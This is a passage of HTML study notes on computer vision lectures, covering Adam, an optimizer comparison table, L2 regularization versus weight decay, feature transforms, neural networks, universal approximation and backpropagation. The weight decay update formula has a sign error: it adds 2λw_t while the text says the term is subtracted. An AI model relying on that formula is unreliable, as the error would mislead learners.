</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#note-cs-cv-lec3-__codelineno-8-5"></a>    <span class="n">moment1_unbias</span> <span class="o">=</span> <span class="n">moment1</span> <span class="o">/</span> <span class="p">(</span><span class="mi">1</span> <span class="o">-</span> <span class="n">beta1</span> <span class="o">**</span> <span class="n">t</span><span class="p">)</span> <span class="c1">#Bias Correction</span>
</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#note-cs-cv-lec3-__codelineno-8-6"></a>    <span class="n">moment2_unbias</span> <span class="o">=</span> <span class="n">moment2</span> <span class="o">/</span> <span class="p">(</span><span class="mi">1</span> <span class="o">-</span> <span class="n">beta2</span> <span class="o">**</span> <span class="n">t</span><span class="p">)</span> <span class="c1">#Bias Correction</span>
</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#note-cs-cv-lec3-__codelineno-8-7"></a>    <span class="n">w</span> <span class="o">-=</span> <span class="n">learning_rate</span> <span class="o">*</span> <span class="n">moment1_unbias</span> <span class="o">/</span> <span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">sqrt</span><span class="p">(</span><span class="n">moment2_unbias</span><span class="p">)</span> <span class="o">+</span> <span class="mf">1e-7</span><span class="p">)</span>
</span></code></pre></div>
<h2 id="note-cs-cv-lec3-comparison-of-optimization-algorithms">Comparison of Optimization Algorithms<a class="headerlink" href="#note-cs-cv-lec3-comparison-of-optimization-algorithms" title="Permanent link">&para;</a></h2>
<table>
<thead>
<tr>
<th>Algorithm</th>
<th>Tracks first moments (Momentum)</th>
<th>Tracks second moments (Adaptive learning rates)</th>
<th>Leaky second moments</th>
<th>Bias correction for moment estimates</th>
</tr>
</thead>
<tbody>
<tr>
<td>SGD</td>
<td>❌</td>
<td>❌</td>
<td>❌</td>
<td>❌</td>
</tr>
<tr>
<td>SGD+Momentum</td>
<td>✔️</td>
<td>❌</td>
<td>❌</td>
<td>❌</td>
</tr>
<tr>
<td>Nesterov</td>
<td>✔️</td>
<td>❌</td>
<td>❌</td>
<td>❌</td>
</tr>
<tr>
<td>AdaGrad</td>
<td>❌</td>
<td>✔️</td>
<td>❌</td>
<td>❌</td>
</tr>
<tr>
<td>RMSProp</td>
<td>❌</td>
<td>✔️</td>
<td>✔️</td>
<td>❌</td>
</tr>
<tr>
<td>Adam</td>
<td>✔️</td>
<td>✔️</td>
<td>✔️</td>
<td>✔️</td>
</tr>
</tbody>
</table>
<h2 id="note-cs-cv-lec3-l2-regularization-vs-weight-decay">L2 Regularization vs Weight Decay<a class="headerlink" href="#note-cs-cv-lec3-l2-regularization-vs-weight-decay" title="Permanent link">&para;</a></h2>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec3-8.png" width="500" />
</figure>
<p>L2 Regularization and Weight Decay have some differences in their application within optimization algorithms:</p>
<h3 id="note-cs-cv-lec3-l2-regularization">L2 Regularization<a class="headerlink" href="#note-cs-cv-lec3-l2-regularization" title="Permanent link">&para;</a></h3>
<ul>
<li><strong>Objective Function</strong>: <span class="arithmatex">\( L(w) = L_{\text{data}}(w) + \lambda |w|^2 \)</span><ul>
<li>Here, <span class="arithmatex">\(\lambda |w|^2\)</span> is the regularization term used to prevent overfitting.</li>
</ul>
</li>
<li><strong>Gradient Calculation</strong>: <span class="arithmatex">\( g_t = \nabla L(w_t) = \nabla L_{\text{data}}(w_t) + 2\lambda w_t \)</span><ul>
<li>The gradient includes the effect of the regularization term.</li>
</ul>
</li>
<li><strong>Update Step</strong>: <span class="arithmatex">\( w_{t+1} = w_t - \alpha s_t \)</span><ul>
<li>Here, <span class="arithmatex">\( s_t \)</span> is the update amount calculated by the optimizer.</li>
</ul>
</li>
</ul>
<h3 id="note-cs-cv-lec3-weight-decay">Weight Decay<a class="headerlink" href="#note-cs-cv-lec3-weight-decay" title="Permanent link">&para;</a></h3>
<ul>
<li><strong>Objective Function</strong>: <span class="arithmatex">\( L(w) = L_{\text{data}}(w) \)</span><ul>
<li>There is no explicit regularization term.</li>
</ul>
</li>
<li><strong>Gradient Calculation</strong>: <span class="arithmatex">\( g_t = \nabla L(w_t) \)</span><ul>
<li>Only the gradient of the data loss is calculated.</li>
</ul>
</li>
<li>
<p><strong>Update Step</strong>: <span class="arithmatex">\( w_{t+1} = w_t - \alpha s_t + 2\lambda w_t \)</span></p>
<ul>
<li>The weight decay term is directly subtracted in the update step.</li>
</ul>
</li>
<li>
<p><span class="arithmatex">\( s_t \)</span> represents the update amount calculated by the optimizer based on the current gradient <span class="arithmatex">\( g_t \)</span>. It varies depending on the optimization algorithm:</p>
<ul>
<li><strong>SGD</strong>: <span class="arithmatex">\( s_t = g_t \)</span></li>
<li><strong>SGD+Momentum</strong>: <span class="arithmatex">\( s_t \)</span> includes a momentum term</li>
<li><strong>Adam</strong>: <span class="arithmatex">\( s_t \)</span> includes both momentum and adaptive learning rate adjustments</li>
</ul>
</li>
</ul>
<h3 id="note-cs-cv-lec3-key-differences">Key Differences<a class="headerlink" href="#note-cs-cv-lec3-key-differences" title="Permanent link">&para;</a></h3>
<ul>
<li><strong>Equivalence</strong>: For SGD and SGD+Momentum, L2 Regularization and Weight Decay are equivalent, so they are often used interchangeably.</li>
<li><strong>Differences</strong>: For adaptive methods (such as AdaGrad, RMSProp, Adam, etc.), they are not equivalent. In adaptive methods, weight decay directly affects the update step, while L2 regularization affects the gradient calculation.</li>
</ul>
<p>When using adaptive optimization algorithms, careful selection of the regularization strategy is necessary.</p>
<h2 id="note-cs-cv-lec3-second-order-optimization">Second order optimization<a class="headerlink" href="#note-cs-cv-lec3-second-order-optimization" title="Permanent link">&para;</a></h2>
<p>Upon using first other optimization,we can also use the <em>second order optimization</em> </p>
<ul>
<li>Use gradient and Hessian to make quadratic qpproximation</li>
<li>Step to minimize the approximation</li>
</ul>
<p>For those who are steep,the step will be smaller,and for those who are flat,the step will be larger.</p>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec3-9.png" width="400" />

<figcaption> steep </figcaption>
</figure>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec3-10.png" width="400" />

<figcaption> flat </figcaption>
</figure>
<p>Second-Order Taylor Expansion:</p>
<div class="arithmatex">\[
L(w) \approx L(w_0) + (w - w_0)^T \nabla_w L(w_0) + \frac{1}{2}(w - w_0)^T H_w L(w_0)(w - w_0)
\]</div>
<p>Solving for the critical point we obtain the Newton parameter update:</p>
<div class="arithmatex">\[
w^* = w_0 - H_w L(w_0)^{-1} \nabla_w L(w_0)
\]</div></section><section class="print-page" id="note-cs-cv-lec4" heading-number="2.4.5.5"><h1 id="note-cs-cv-lec4-neural-networks">Neural Networks<a class="headerlink" href="#note-cs-cv-lec4-neural-networks" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 1595 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 20 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 6 分钟</p>
</div>
<h2 id="note-cs-cv-lec4-feature-transforms">Feature Transforms<a class="headerlink" href="#note-cs-cv-lec4-feature-transforms" title="Permanent link">&para;</a></h2>
<p>On the geometric viewpoint of linear classifiers, we can see that the classifier is a hyperplane in the feature space.While this may not be useful in the following cases:</p>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec4-1.png" width="400" />

<figcaption>original space</figcaption>
</figure>
<p>One solution is to use feature transforms to map the data to a higher dimensional space.For example, we can use the following feature transform to convert cartesian coordinates to polar coordinates:</p>
<div class="arithmatex">\[
    \begin{bmatrix}
        x \\
        y
    \end{bmatrix}
    \rightarrow
    \begin{bmatrix}
        r \\
        \theta
    \end{bmatrix}
\]</div>
<p>where <span class="arithmatex">\(r = \sqrt{x^2 + y^2}\)</span> and <span class="arithmatex">\(\theta = \tan^{-1}(y/x)\)</span>. and <span class="arithmatex">\(x,y\)</span> are the original features.<strong>This is a non-linear transform.</strong></p>
<p>And we get the following result:</p>
<figure>
    <img alt="" src="../NOTE/CS/CV/img/lec4-2.png" width="400" />

<figcaption>transformed space</figcaption>
</figure>
<p>Now we can use a linear classifier to classify the data in the transformed space.</p>
<p>For image feature, there are two major features transformed from the original image:</p>
<ul>
<li><strong>Color Histogram</strong></li>
<li><strong>Histogram of Oriented Gradients (HOG)</strong></li>
</ul>
<h3 id="note-cs-cv-lec4-color-histogram">Color Histogram<a class="headerlink" href="#note-cs-cv-lec4-color-histogram" title="Permanent link">&para;</a></h3>
<p>A color histogram is a representation of the distribution of colors in an image. It is used to describe the color content of an image and is a common feature in image processing and computer vision. Here's how it works:</p>
<ol>
<li>
<p><strong>Color Space</strong>: The image is represented in a specific color space, such as RGB (Red, Green, Blue) or HSV (Hue, Saturation, Value).</p>
</li>
<li>
<p><strong>Quantization</strong>: The color space is divided into discrete bins. For example, in an 8-bit RGB image, each color channel can have 256 possible values, but these can be grouped into fewer bins to simplify the histogram.</p>
</li>
<li>
<p><strong>Counting</strong>: For each pixel in the image, the color is determined and the corresponding bin in the histogram is incremented. This results in a histogram where each bin represents the number of pixels in the image that have colors within a certain range.</p>
</li>
<li>
<p><strong>Normalization</strong>: The histogram can be normalized to make it independent of the image size, allowing for comparison between images of different sizes.</p>
</li>
</ol>
<p>Color histograms are useful for applications such as image retrieval, object recognition, and image classification, as they provide a compact summary of the color information in an image.</p>
<p>An example of color histogram is shown below:</p>
<figure>
    <img alt="" src="../NOTE/CS/CV/img/lec4-3.png" width="400" />

<figcaption>color histogram</figcaption>
</figure>
<h3 id="note-cs-cv-lec4-histogram-of-oriented-gradients-hog">Histogram of Oriented Gradients (HOG)<a class="headerlink" href="#note-cs-cv-lec4-histogram-of-oriented-gradients-hog" title="Permanent link">&para;</a></h3>
<p>The Histogram of Oriented Gradients (HOG) is a feature descriptor used in computer vision and image processing for the purpose of object detection. It is widely used in the field of object detection, such as pedestrian detection in computer vision systems.And it is some kind of dual of color histogram.</p>
<p>The HOG descriptor is based on the observation that local object appearance and shape can often be characterized effectively by the distribution of local intensity gradients or edge directions in a local region around each pixel.</p>
<p>The steps to compute the HOG descriptor are as follows:</p>
<ol>
<li>
<p><strong>Gradient Calculation</strong>: Compute the gradient of the image in the x and y directions.</p>
</li>
<li>
<p><strong>Orientation Binning</strong>: Divide the gradient magnitude and orientation into a set of bins.</p>
</li>
<li>
<p><strong>Block Normalization</strong>: Normalize the histogram of local gradients in each block.</p>
</li>
<li>
<p><strong>Feature Vector</strong>: Concatenate the histogram of local gradients in all blocks to form the HOG descriptor.</p>
</li>
</ol>
<p>The HOG descriptor is then used as input to a machine learning algorithm, such as Support Vector Machine (SVM), to train a classifier for object detection.</p>
<p>An example of HOG is shown below:</p>
<figure>
    <img alt="" src="../NOTE/CS/CV/img/lec4-4.png" width="400" />

<figcaption>HOG</figcaption>
</figure>
<h3 id="note-cs-cv-lec4-bag-of-words">Bag of Words<a class="headerlink" href="#note-cs-cv-lec4-bag-of-words" title="Permanent link">&para;</a></h3>
<p>The Bag of Words (BoW) model is a feature extraction technique commonly used in computer vision and natural language processing. In computer vision, it's often called "Bag of Visual Words" and is used to represent images as collections of visual features.</p>
<p>It is data driven,and usually has following steps:</p>
<ul>
<li>
<p><strong>Build code book</strong> : Extract random patches from training images,and cluster them into 'visual words' aka 'code words'.</p>
</li>
<li>
<p><strong>Encode images</strong> : For each image,extract local features,and assign each 
feature to its nearest visual word.</p>
</li>
<li><strong>Build histogram</strong> : Count how many features were assigned to each visual word.</li>
</ul>
<p>An example of the BoW process is shown below:</p>
<figure>
    <img alt="" src="../NOTE/CS/CV/img/lec4-5.png" width="400" />

<figcaption>Bag of Visual Words process</figcaption>
</figure>
<p>In real applications,we usually combine the 3 Image Features to get a better performance.</p>
<figure>
    <img alt="" src="../NOTE/CS/CV/img/lec4-6.png" width="400" />

<figcaption>Bag of Visual Words process</figcaption>
</figure>
<h2 id="note-cs-cv-lec4-neural-networks_1">Neural Networks<a class="headerlink" href="#note-cs-cv-lec4-neural-networks_1" title="Permanent link">&para;</a></h2>
<figure>
    <img alt="" src="../NOTE/CS/CV/img/lec4-7.png" width="400" />

<figcaption>Neural Networks vs Image Features</figcaption>
</figure>
<blockquote>
<p>Neural Networks are end-to-end,and can learn features from raw data.</p>
</blockquote>
<p>In the context of machine learning, "end-to-end" refers to a system's ability to learn directly from input data to output results without intermediate manual feature extraction or other human intervention. This term is usually associated with neural networks, particularly deep learning models, rather than traditional Image Features methods.</p>
<ul>
<li><strong>Automatic Feature Learning</strong>: Neural networks can automatically learn features from raw data without manual feature extraction steps, making the entire process from input to output a continuous learning process.</li>
<li><strong>Direct Mapping</strong>: In end-to-end systems, the model directly maps input data (e.g., images) to output results (e.g., classification labels) without requiring manual feature engineering.</li>
<li><strong>Unified Framework</strong>: The entire model is trained under a unified framework, with the loss function directly affecting the final output, guiding the parameter updates throughout the network.</li>
</ul>
<p>In contrast, traditional Image Features methods typically require manual feature extraction before feeding these features into a separate machine learning algorithm for training and prediction, which is not considered "end-to-end."</p>
<h3 id="note-cs-cv-lec4-neural-network-architecture">Neural Network Architecture<a class="headerlink" href="#note-cs-cv-lec4-neural-network-architecture" title="Permanent link">&para;</a></h3>
<p>In a Linear Classifier,we have:</p>
<div class="arithmatex">\[
    f(x,w,b) = w^Tx + b
\]</div>
<p>Now in a 2-layer Neural Network,we have:</p>
<div class="arithmatex">\[
    f(x,w,b) = w_2 \sigma(w_1^Tx + b_1) + b_2
\]</div>
<p>where <span class="arithmatex">\(\sigma\)</span> is the activation function.Here we use ReLU as the activation function.Which is defined as:</p>
<div class="arithmatex">\[
    \sigma(x) = \max(0,x)
\]</div>
<figure>
    <img alt="" src="../NOTE/CS/CV/img/lec4-8.png" width="500" />

<figcaption>Neural Network Architecture</figcaption>
</figure>
<blockquote>
<p><span class="arithmatex">\(h_i=\sigma(W1_i^Tx+b1_i)\)</span>,<span class="arithmatex">\(s_i=W2_i^Th+b2_i\)</span>,in this case <span class="arithmatex">\(W1(100*3072)\)</span> and <span class="arithmatex">\(W2(10*100)\)</span> are the weights,and <span class="arithmatex">\(b1(100)\)</span> and <span class="arithmatex">\(b2(10)\)</span> are the biases.h is the hidden layer,and s is the output layer.</p>
</blockquote>
<div class="admonition info">
<p class="admonition-title">Deep Neural Network</p>
<p>A Deep Neural Network (DNN) is a type of neural network that consists of multiple layers of neurons, allowing it to learn more complex patterns and relationships in the data.</p>
<p>If there are <span class="arithmatex">\(n\)</span> weight matrices,then we call it a <span class="arithmatex">\(n\)</span>-layer Neural Network.</p>
<p><figure markdown="span">
    <img alt="" src="../NOTE/CS/CV/img/lec4-9.png" width="500" />
<figcaption>six layer Neural Network</figcaption>
</figure></p>
</div>
<figure>
    <img alt="" src="../NOTE/CS/CV/img/lec4-10.png" width="500" />

<figcaption>Biological Neuron and Artificial Neuron</figcaption>
</figure>
<blockquote>
<p>与生物学上的神经元类似，图中隐藏层的一个元素是其它神经元的输出累加的结果，这里的w并不是指矩阵中的元素w，而是指与其连接的神经元对应的权重。例如这里的第二个元素是<span class="arithmatex">\(h_2=w_{21}x_1+w_{22}x_2+w_{23}x_3+b_2\)</span>。</p>
</blockquote>
<h3 id="note-cs-cv-lec4-activation-function">Activation Function<a class="headerlink" href="#note-cs-cv-lec4-activation-function" title="Permanent link">&para;</a></h3>
<figure>
    <img alt="" src="../NOTE/CS/CV/img/lec4-11.png" width="500" />

<figcaption>Activation Function</figcaption>
</figure>
<p>Without the activation function,the output is still a linear combination of the inputs.Which will still not be useful when dealing with complex problems,such as the xor problem.</p>
<p>But with the activation function,we can do some Space Warping,which is something that feature transform cannot do, to make the data more separable.</p>
<p>For example</p>
<figure>
    <img alt="" src="../NOTE/CS/CV/img/lec4-12.png" width="500" />

<figcaption>Feature Transform</figcaption>
</figure>
<p>But with the activation function</p>
<figure>
    <img align="left" alt="" src="../NOTE/CS/CV/img/lec4-13.png" width="350" />
    <img align="right" alt="" src="../NOTE/CS/CV/img/lec4-14.png" width="350" />
</figure>
<p>对于A区域，在两条直线上方，不变，对于B区域，在绿色直线下方，其得到的值为0，向绿色部分靠拢，对于D区域，在红色直线下方，其得到的值为0，向红色部分靠拢。对于C区域，在两条直线之间，向原点靠拢，所以最后的结果很容易被一个Hyperplane分开。</p>
<p>激活函数做的事相当于允许这个Hyperplane在空间中折叠，激活函数越多，折叠越多，可以拟合的函数越复杂。</p>
<figure>
    <img alt="" src="../NOTE/CS/CV/img/lec4-15.png" width="500" />

<figcaption>Activation Function</figcaption>
</figure>
<h3 id="note-cs-cv-lec4-universal-approximation">Universal Approximation<a class="headerlink" href="#note-cs-cv-lec4-universal-approximation" title="Permanent link">&para;</a></h3>
<p>A neural network with one hidden layer can approximate any function <span class="arithmatex">\(f: \mathbb{R}^N \rightarrow \mathbb{R}^M\)</span> with arbitrary precision.</p>
<figure>
    <img alt="" src="../NOTE/CS/CV/img/lec4-16.png" width="400" />

<figcaption>Example</figcaption>
</figure>
<div class="arithmatex">\[
\begin{align*}
h_1 &amp;= \max(0, w_1 \cdot x + b_1) \\
h_2 &amp;= \max(0, w_2 \cdot x + b_2) \\
h_3 &amp;= \max(0, w_3 \cdot x + b_3) \\
y &amp;= u_1 \cdot h_1 + u_2 \cdot h_2 + u_3 \cdot h_3 + p \\
\end{align*}
\]</div>
<p>Output is a sum of shifted, scaled ReLUs:</p>
<ul>
<li>Flip left/right based on sign of <span class="arithmatex">\( w_i \)</span></li>
<li>Slope is given by <span class="arithmatex">\( u_i \cdot w_i \)</span></li>
<li>Position of "bend" given by <span class="arithmatex">\( b_i \)</span></li>
</ul>
<figure>
    <img alt="" src="../NOTE/CS/CV/img/lec4-17.png" width="400" />

<figcaption>Universal Approximation</figcaption>
</figure>
<p>To approximate a "bump" function",we can use a two-layer ReLU network.</p>
<figure>
    <img alt="" src="../NOTE/CS/CV/img/lec4-18.png" width="400" />

<figcaption>Bump Function</figcaption>
</figure>
<p>For any function,we can use sufficient number of "Bump" function to approximate it.</p>
<figure>
    <img alt="" src="../NOTE/CS/CV/img/lec4-19.png" width="400" />

<figcaption>Approximation</figcaption>
</figure>
<h2 id="note-cs-cv-lec4-convex-function">Convex Function<a class="headerlink" href="#note-cs-cv-lec4-convex-function" title="Permanent link">&para;</a></h2>
<p>A function <span class="arithmatex">\(f\)</span> is convex if for any <span class="arithmatex">\(x,y\)</span> in the domain of <span class="arithmatex">\(f\)</span>,the following inequality holds:</p>
<div class="arithmatex">\[
    f(tx+(1-t)y)\leqslant tf(x)+(1-t)f(y)
\]</div>
<p>This inequality is also called the Jensen's inequality.</p>
<p><em>Generally speaking, convex functions are easy to optimize: can derive theoretical guarantees about converging to global minimum.</em></p>
<p>Linear classifiers optimize a convex loss function.</p>
<figure>
    <img alt="" src="../NOTE/CS/CV/img/lec4-20.png" width="380" />

<figcaption>Convex Function</figcaption>
</figure>
<p>In Neural Networks,most of them need nonconvex optimization ,there is few or no guarantees to converge to the global minimum.</p>
<p>But luckily,for most of the cases,the local minimum is also good,and finding a theoretical guarantee is a active research area.</p></section><section class="print-page" id="note-cs-cv-lec5" heading-number="2.4.5.6"><h1 id="note-cs-cv-lec5-backpropagation">Backpropagation<a class="headerlink" href="#note-cs-cv-lec5-backpropagation" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 1515 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M392.8 1.2c-17-4.9-34.7 5-39.6 22l-128 448c-4.9 17 5 34.7 22 39.6s34.7-5 39.6-22l128-448c4.9-17-5-34.7-22-39.6m80.6 120.1c-12.5 12.5-12.5 32.8 0 45.3l89.3 89.4-89.4 89.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l112-112c12.5-12.5 12.5-32.8 0-45.3l-112-112c-12.5-12.5-32.8-12.5-45.3 0zm-306.7 0c-12.5-12.5-32.8-12.5-45.3 0l-112 112c-12.5 12.5-12.5 32.8 0 45.3l112 112c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L77.3 256l89.4-89.4c12.5-12.5 12.5-32.8 0-45.3"/></svg></span> 19 行代码 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 12 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 5 分钟</p>
</div>
<h2 id="note-cs-cv-lec5-backprop-with-scalars">Backprop with scalars<a class="headerlink" href="#note-cs-cv-lec5-backprop-with-scalars" title="Permanent link">&para;</a></h2>
<h3 id="note-cs-cv-lec5-computational-graphs">Computational Graphs<a class="headerlink" href="#note-cs-cv-lec5-computational-graphs" title="Permanent link">&para;</a></h3>
<p>In order to make the process of computing gradients more efficient, we can use computational graphs,a way to represent the computation of a function.</p>
<figure>
    <img alt="" src="../NOTE/CS/CV/img/lec5-1.png" width="400" />

<figcaption>Computational Graph</figcaption>
</figure>
<p>In a computational graph, to compute the gradient of the function by backpropagation, we can use the chain rule.</p>
<p>There is two passes:</p>
<ul>
<li>Forward pass: Compute the value of the function.</li>
<li>Backward pass: Compute the gradient of the function.</li>
</ul>
<figure>
    <img alt="" src="../NOTE/CS/CV/img/lec5-2.png" width="400" />

<figcaption>Computing Gradients</figcaption>
</figure>
<div class="arithmatex">\[
    \frac{\partial z}{\partial x} =\frac{\partial y}{\partial x} \frac{\partial z}{\partial y} 
\]</div>
<p>where <span class="arithmatex">\(\frac{\partial z}{\partial y}\)</span> is called the upstream gradient, and <span class="arithmatex">\(\frac{\partial y}{\partial x}\)</span> is the local gradient,and <span class="arithmatex">\(\frac{\partial z}{\partial x}\)</span> is the downstream gradient.</p>
<p>for the common functions, such as sigmoid, ReLU, etc, we can compute the local gradient easily.And pack them into the computational graph instead of computing them step by step.</p>
<figure>
    <img alt="" src="../NOTE/CS/CV/img/lec5-3.png" width="400" />

<figcaption>Computational Graph</figcaption>
</figure>
<h3 id="note-cs-cv-lec5-patterns-in-gradient-flow">Patterns in Gradient flow<a class="headerlink" href="#note-cs-cv-lec5-patterns-in-gradient-flow" title="Permanent link">&para;</a></h3>
<h4 id="note-cs-cv-lec5-add-gate">Add gate<a class="headerlink" href="#note-cs-cv-lec5-add-gate" title="Permanent link">&para;</a></h4>
<p>An add gate is a gradient distribution gate.</p>
<figure>
    <img alt="" src="../NOTE/CS/CV/img/lec5-4.png" width="400" />

<figcaption>Add Gate</figcaption>
</figure>
<p>For example,<span class="arithmatex">\(f(x,y)=x+y\)</span>, the gradient of <span class="arithmatex">\(f\)</span> with respect to <span class="arithmatex">\(x\)</span> and <span class="arithmatex">\(y\)</span> is <span class="arithmatex">\(\frac{\partial f}{\partial x}=1\)</span> and <span class="arithmatex">\(\frac{\partial f}{\partial y}=1\)</span> . So whatever the upstream gradient is, it will be distributed to the two inputs.</p>
<h4 id="note-cs-cv-lec5-copy-gate">Copy gate<a class="headerlink" href="#note-cs-cv-lec5-copy-gate" title="Permanent link">&para;</a></h4>
<p>A copy gate is a gradient addition gate,somehow a dual of the add gate.</p>
<figure>
    <img alt="" src="../NOTE/CS/CV/img/lec5-5.png" width="400" />

<figcaption>Copy Gate</figcaption>
</figure>
<p>For example,if we have a function <span class="arithmatex">\(z=f(x,y)\)</span>,and <span class="arithmatex">\(x=y=t\)</span>,</p>
<p>then</p>
<div class="arithmatex">\[\frac{\partial z}{\partial t} = \frac{\partial x}{\partial t} \frac{\partial z}{\partial x} + \frac{\partial y}{\partial t} \frac{\partial z}{\partial y}\]</div>
<p>where the local stream <span class="arithmatex">\(\frac{\partial x}{\partial t}\)</span> and <span class="arithmatex">\(\frac{\partial y}{\partial t}\)</span> is <span class="arithmatex">\(1\)</span>.</p>
<h4 id="note-cs-cv-lec5-multiply-gate">Multiply gate<a class="headerlink" href="#note-cs-cv-lec5-multiply-gate" title="Permanent link">&para;</a></h4>
<p>A multiply gate is a gradient swap gate.</p>
<figure>
    <img alt="" src="../NOTE/CS/CV/img/lec5-6.png" width="400" />

<figcaption>Multiply Gate</figcaption>
</figure>
<p>For example,if we have a function <span class="arithmatex">\(z=xy\)</span>,</p>
<p>we know that <span class="arithmatex">\(\frac{\partial z}{\partial x}=y\)</span> and <span class="arithmatex">\(\frac{\partial z}{\partial y}=x\)</span>,</p>
<p>so if we have an upstream gradient <span class="arithmatex">\(\frac{\partial L}{\partial z}=2\)</span>,</p>
<p>then the downstream gradient of <span class="arithmatex">\(x\)</span> and <span class="arithmatex">\(y\)</span> are <span class="arithmatex">\(\frac{\partial L}{\partial x}=2y\)</span> and <span class="arithmatex">\(\frac{\partial L}{\partial y}=2x\)</span>.</p>
<h3 id="note-cs-cv-lec5-coding-format">Coding format<a class="headerlink" href="#note-cs-cv-lec5-coding-format" title="Permanent link">&para;</a></h3>
<p>when we write the code, we follow the following steps:</p>
<ul>
<li>store every intermediate value in the forward pass.</li>
<li>compute the gradient of the loss with respect to every variable in the backward pass.</li>
</ul>
<p>For example,if we have a function as following:</p>
<figure>
    <img alt="" src="../NOTE/CS/CV/img/lec5-7.png" width="400" />

<figcaption>Sample</figcaption>
</figure>
<p>the code would be written as:</p>
<div class="language-python highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#note-cs-cv-lec5-__codelineno-0-1"></a><span class="k">def</span> <span class="nf">f</span><span class="p">(</span><span class="n">w0</span><span class="p">,</span><span class="n">x0</span><span class="p">,</span><span class="n">w1</span><span class="p">,</span><span class="n">x1</span><span class="p">,</span><span class="n">w2</span><span class="p">):</span>
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#note-cs-cv-lec5-__codelineno-0-2"></a>    <span class="n">s0</span><span class="o">=</span><span class="n">w0</span><span class="o">*</span><span class="n">x0</span>
</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#note-cs-cv-lec5-__codelineno-0-3"></a>    <span class="n">s1</span><span class="o">=</span><span class="n">w1</span><span class="o">*</span><span class="n">x1</span>
</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#note-cs-cv-lec5-__codelineno-0-4"></a>    <span class="n">s2</span><span class="o">=</span><span class="n">s0</span><span class="o">+</span><span class="n">s1</span>
</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#note-cs-cv-lec5-__codelineno-0-5"></a>    <span class="n">s3</span><span class="o">=</span><span class="n">s2</span><span class="o">+</span><span class="n">w2</span>
</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#note-cs-cv-lec5-__codelineno-0-6"></a>    <span class="n">L</span><span class="o">=</span><span class="n">sigmoid</span><span class="p">(</span><span class="n">s3</span><span class="p">)</span>
</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#note-cs-cv-lec5-__codelineno-0-7"></a>
</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#note-cs-cv-lec5-__codelineno-0-8"></a>    <span class="n">grad_L</span><span class="o">=</span><span class="mf">1.0</span>
